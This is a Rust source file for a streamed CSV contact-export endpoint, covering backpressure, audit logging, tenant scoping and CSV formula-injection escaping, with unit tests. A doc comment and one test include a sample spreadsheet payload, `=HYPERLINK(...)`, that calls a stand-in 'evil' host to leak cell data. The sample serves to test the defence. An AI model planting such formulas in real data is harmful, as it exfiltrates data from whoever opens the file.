// SPDX-License-Identifier: AGPL-3.0-only

//! `POST /contacts/export`: every contact a filter matches, as CSV, **streamed**.
//!
//! Nothing here holds the result. A producer task reads rows off the wire one at a time, renders
//! them into a chunk of about [`CHUNK_BYTES`], and hands the chunk to the response body through a
//! channel of [`CHUNKS_IN_FLIGHT`] slots. A slow client fills the channel, `send` waits, the
//! producer stops reading, and the connection's own flow control stops Postgres. Memory is
//! therefore bounded by the chunk size, not by the row count.
//!
//! The producer is a task of its own for a second reason: it writes the audit row once the stream
//! ends, and a handler future is dropped when the client disconnects. Someone who reads half the
//! book and hangs up has still read half the book.

use std::{borrow::Cow, time::Duration};

use axum::body::Body;
use chrono::{DateTime, SecondsFormat, Utc};
use futures_util::{StreamExt, stream};
use serde_json::{Value, json};
use sqlx::{PgPool, Postgres, QueryBuilder, Row, pool::PoolConnection};
use tokio::sync::mpsc;
use uuid::Uuid;

use super::{ContactFilter, push_filter};
use crate::{
    audit::{self, Actor, AuditEvent, actions},
    custom_fields::Definition,
    http::request_meta::RequestMeta,
    segments::{
        compile::{SUPPRESSION_ARMS, push_rules},
        rules::Group,
    },
};

/// A chunk is flushed to the client once it holds this many bytes.
const CHUNK_BYTES: usize = 32 * 1024;

/// Chunks the producer may be ahead of the client. With `CHUNK_BYTES` this is the whole of what
/// an export holds, however many contacts it covers.
const CHUNKS_IN_FLIGHT: usize = 2;

/// How long the producer waits for the client to take a chunk before it gives the export up. `send`
/// has no timeout of its own, so without this a client that stops reading holds a pooled connection
/// and a Postgres backend until TCP gives up, and a request-count limit does nothing about a
/// request that never ends. A browser draining a download takes a chunk in milliseconds.
pub const SEND_TIMEOUT: Duration = Duration::from_secs(30);

type Chunk = Result<Vec<u8>, std::io::Error>;

/// What the audit row needs that the stream does not know. `filter` is the document **already
/// redacted** by the caller: this module never sees the search text.
pub struct Audit {
    pub meta: RequestMeta,
    pub actor: Actor,
    pub filter: Value,
}

/// A cell, ready for a CSV file: neutralised against formula injection, then quoted if it must be.
///
/// A cell whose first character is `=`, `+`, `-`, `@`, tab or CR is a formula to Excel, Sheets
/// and LibreOffice, and a `first_name` of `=HYPERLINK("http://evil/?x="&A1,"click")` is settable
/// through any signup form. It would execute in the browser of whoever opens the export of the
/// whole book, who is the person with the most access. A leading `'` makes every one of them read
/// the cell as text.
///
/// **A cell that is a finite number is left alone**, so a number field of `-5` round-trips as `-5`
/// and not as the text `'-5`. The test is on the whole cell with no `trim`: `-5-5`, `-inf`, `-nan`
/// and `\t5` are not numbers and stay prefixed. An email that begins `+` or `-` also stays
/// prefixed (plus-addressing makes `+x@y.com` real); the importer strips a leading apostrophe on
/// read, which is lossless, where an exception per column would mean reasoning about a
/// spreadsheet's parser per column.
///
/// **What M1c's importer must undo when it reads this file back, both of them lossless:** (1) a
/// leading `'` on a cell, and (2) the backslash escapes in the `lists` and `tags` columns: split
/// on a `;` that no backslash precedes, split a list entry at its one unescaped `:` into name and
/// status, then turn `\\`, `\;` and `\:` back into `\`, `;` and `:`.
fn push_cell(out: &mut String, cell: &str) {
    let formula = matches!(
        cell.chars().next(),
        Some('=' | '+' | '-' | '@' | '\t' | '\r')
    ) && !cell.parse::<f64>().is_ok_and(f64::is_finite);
    let cell: Cow<str> = if formula {
        Cow::Owned(format!("'{cell}"))
    } else {
        Cow::Borrowed(cell)
    };
    if cell.contains([',', '"', '\n', '\r']) {
        out.push('"');
        out.push_str(&cell.replace('"', "\"\""));
        out.push('"');
    } else {
        out.push_str(&cell);
    }
}

fn push_row<'a>(out: &mut String, cells: impl IntoIterator<Item = &'a str>) {
    for (i, cell) in cells.into_iter().enumerate() {
        if i > 0 {
            out.push(',');
        }
        push_cell(out, cell);
    }
    out.push_str("\r\n");
}

/// A custom field's stored value as text; absent is empty, a multi_select is semicolon-joined.
fn attr_text(value: Option<&Value>) -> String {
    match value {
        None | Some(Value::Null) => String::new(),
        Some(Value::String(s)) => s.clone(),
        Some(Value::Array(items)) => items
            .iter()
            .filter_map(Value::as_str)
            .collect::<Vec<_>>()
            .join(";"),
        Some(other) => other.to_string(),
    }
}

/// The export query. **The workspace clause is written here**: neither `push_filter` nor
/// `push_rules` emits one, and a missing one exports every tenant's contacts.
///
/// A name as the `lists` and `tags` columns carry it: `\`, `;` and `:` each get a backslash, `\`
/// first. `;` joins the names and `:` separates a list's name from its status, so without this a
/// list named `A;B` reads back as two lists and one named `C:D` as a list `C` with the status `D...`.
/// Almost no name holds any of them, so the column stays readable in a spreadsheet, and it is
/// lossless for the importer.
fn escaped(column: &str) -> String {
    format!("replace(replace(replace({column}, '\\', '\\\\'), ';', '\\;'), ':', '\\:')")
}

/// `lists` is `name:status` for every membership, whatever its status: an export that cannot tell
/// `unsubscribed` from `subscribed` is a re-subscription waiting for the importer. `tags` are
/// names with no status, escaped the same way. `contacts` is not aliased: the fragments the filter
/// appends refer to it by name.
fn query(
    workspace_id: Uuid,
    filter: &ContactFilter,
    rules: Option<&Group>,
) -> QueryBuilder<Postgres> {
    let (list, tag) = (escaped("l.name"), escaped("t.name"));
    let mut q = QueryBuilder::<Postgres>::new(format!(
        "select contacts.id, contacts.email, contacts.first_name, contacts.last_name, \
         contacts.timezone, contacts.created_at, contacts.updated_at, contacts.attributes, \
         coalesce((select string_agg({list} || ':' || m.status, ';' order by l.name) \
            from list_memberships m join lists l \
              on l.workspace_id = m.workspace_id and l.id = m.list_id \
            where m.workspace_id = contacts.workspace_id and m.contact_id = contacts.id), '') \
            as lists, \
         coalesce((select string_agg({tag}, ';' order by t.name) \
            from contact_tags ct join tags t \
              on t.workspace_id = ct.workspace_id and t.id = ct.tag_id \
            where ct.workspace_id = contacts.workspace_id and ct.contact_id = contacts.id), '') \
            as tags, ("
    ));
    for (i, arm) in SUPPRESSION_ARMS.iter().enumerate() {
        if i > 0 {
            q.push(" or ");
        }
        q.push("exists ").push(*arm);
    }
    q.push(") as suppressed from contacts where contacts.workspace_id = ")
        .push_bind(workspace_id);
    push_filter(&mut q, filter);
    if let Some(group) = rules {
        q.push(" and ");
        push_rules(&mut q, group);
    }
    q.push(" order by contacts.id");
    q
}

/// What to export. `live` is the workspace's non-archived custom fields, each a column named
/// `attr:<key>` (the rule field's own spelling, so no key can collide with a built-in column).
pub struct Export {
    pub workspace_id: Uuid,
    pub filter: ContactFilter,
    pub rules: Option<Group>,
    pub live: Vec<Definition>,
}

/// Starts the export and returns its body.
pub fn start(
    pool: PgPool,
    mut conn: PoolConnection<Postgres>,
    job: Export,
    audit: Audit,
    send_timeout: Duration,
) -> Body {
    let (tx, mut rx) = mpsc::channel::<Chunk>(CHUNKS_IN_FLIGHT);
    tokio::spawn(async move {
        let (rows, complete) = produce(&mut conn, &job, &tx, send_timeout).await;
        // Before the audit write, which needs a connection of its own: holding this one while
        // asking for another is a cascade on a busy pool, where every finishing export waits on a
        // connection only another finishing export can free, and a completed export goes
        // unrecorded after the acquire timeout. Nor is the audit written on `conn`: a client that
        // left mid-result leaves rows unread on it, and the next statement would first read them.
        drop(conn);
        // Recorded whichever way it ended: complete, a database error, or a client that left.
        let recorded = audit::record(
            &pool,
            &audit.meta,
            AuditEvent {
                workspace_id: Some(job.workspace_id),
                actor: audit.actor,
                action: actions::CONTACTS_EXPORTED,
                target_type: None,
                target_id: None,
                metadata: json!({"filter": audit.filter, "rows": rows, "complete": complete}),
            },
        )
        .await;
        if let Err(e) = recorded {
            tracing::error!(error = ?e, "the export audit row could not be written");
        }
    });
    Body::from_stream(stream::poll_fn(move |cx| rx.poll_recv(cx)))
}

/// Hands a chunk to the client; `false` when the client has gone or has not taken the previous
/// chunk within `timeout`, either of which ends the export.
async fn send(tx: &mpsc::Sender<Chunk>, chunk: Chunk, timeout: Duration) -> bool {
    matches!(
        tokio::time::timeout(timeout, tx.send(chunk)).await,
        Ok(Ok(()))
    )
}

/// Writes the CSV into `tx`; returns how many contacts were sent and whether the stream finished.
async fn produce(
    conn: &mut PoolConnection<Postgres>,
    job: &Export,
    tx: &mpsc::Sender<Chunk>,
    send_timeout: Duration,
) -> (u64, bool) {
    let mut head = String::new();
    let mut names: Vec<String> = ["id", "email", "first_name", "last_name", "timezone"]
        .into_iter()
        .chain(["created_at", "updated_at"])
        .map(str::to_owned)
        .collect();
    names.extend(job.live.iter().map(|d| format!("attr:{}", d.key)));
    names.extend(["lists", "tags", "suppressed"].map(str::to_owned));
    push_row(&mut head, names.iter().map(String::as_str));
    // The header goes out on its own, before the first row is read.
    if !send(tx, Ok(head.into_bytes()), send_timeout).await {
        return (0, false);
    }
    let mut q = query(job.workspace_id, &job.filter, job.rules.as_ref());
    let mut rows = q.build().fetch(&mut **conn);
    let mut chunk = String::new();
    let (mut sent, mut in_chunk) = (0u64, 0u64);
    while let Some(row) = rows.next().await {
        let row = match row {
            Ok(row) => row,
            Err(e) => {
                tracing::error!(error = ?e, "export query failed mid-stream");
                // Aborts the response rather than ending it, so a truncated file is an error to
                // the client and not a short file that looks whole.
                send(
                    tx,
                    Err(std::io::Error::other("export failed")),
                    send_timeout,
                )
                .await;
                return (sent, false);
            }
        };
        let attrs: Value = row.get("attributes");
        let created: DateTime<Utc> = row.get("created_at");
        let updated: DateTime<Utc> = row.get("updated_at");
        let mut cells: Vec<String> = vec![
            row.get::<Uuid, _>("id").to_string(),
            row.get("email"),
            row.get("first_name"),
            row.get("last_name"),
            row.get::<Option<String>, _>("timezone").unwrap_or_default(),
            created.to_rfc3339_opts(SecondsFormat::AutoSi, true),
            updated.to_rfc3339_opts(SecondsFormat::AutoSi, true),
        ];
        cells.extend(job.live.iter().map(|d| attr_text(attrs.get(&d.key))));
        cells.push(row.get("lists"));
        cells.push(row.get("tags"));
        cells.push(row.get::<bool, _>("suppressed").to_string());
        push_row(&mut chunk, cells.iter().map(String::as_str));
        in_chunk += 1;
        if chunk.len() >= CHUNK_BYTES {
            let full = std::mem::take(&mut chunk).into_bytes();
            if !send(tx, Ok(full), send_timeout).await {
                return (sent, false);
            }
            sent += std::mem::take(&mut in_chunk);
        }
    }
    if !chunk.is_empty() && !send(tx, Ok(chunk.into_bytes()), send_timeout).await {
        return (sent, false);
    }
    (sent + in_chunk, true)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cell(s: &str) -> String {
        let mut out = String::new();
        push_cell(&mut out, s);
        out
    }

    #[test]
    fn every_formula_trigger_is_prefixed() {
        for lead in ["=", "+", "-", "@", "\t", "\r"] {
            let got = cell(&format!("{lead}1+1"));
            let got = got.trim_matches('"');
            assert!(got.starts_with('\''), "{lead:?} -> {got:?}");
        }
    }

    #[test]
    fn a_hyperlink_payload_is_text_and_still_one_cell() {
        assert_eq!(
            cell(r#"=HYPERLINK("http://evil/?x="&A1,"click")"#),
            r#""'=HYPERLINK(""http://evil/?x=""&A1,""click"")""#
        );
    }

    #[test]
    fn a_line_break_forces_quoting() {
        assert_eq!(cell("a\nb"), "\"a\nb\"");
        assert_eq!(cell("a\rb"), "\"a\rb\"");
        assert_eq!(cell("a\r\nb"), "\"a\r\nb\"");
        // A leading CR is both: neutralised, then quoted because it holds a CR.
        assert_eq!(cell("\r=1"), "\"'\r=1\"");
    }

    #[test]
    fn a_finite_number_is_left_alone_and_nothing_that_merely_looks_like_one() {
        for n in ["-5", "+5", "-5.5", "-1e3", "-0"] {
            assert_eq!(cell(n), n);
        }
        for t in [
            "-5-5", "-inf", "-nan", "+inf", "\t5", "-5e999", "=5", "@5", "- 5",
        ] {
            assert!(
                cell(t).trim_start_matches('"').starts_with('\''),
                "{t} -> {}",
                cell(t)
            );
        }
    }

    #[test]
    fn ordinary_cells_are_left_alone() {
        assert_eq!(cell("ada"), "ada");
        assert_eq!(cell("a=b"), "a=b");
        assert_eq!(cell(""), "");
        assert_eq!(cell("a,b"), "\"a,b\"");
    }
}
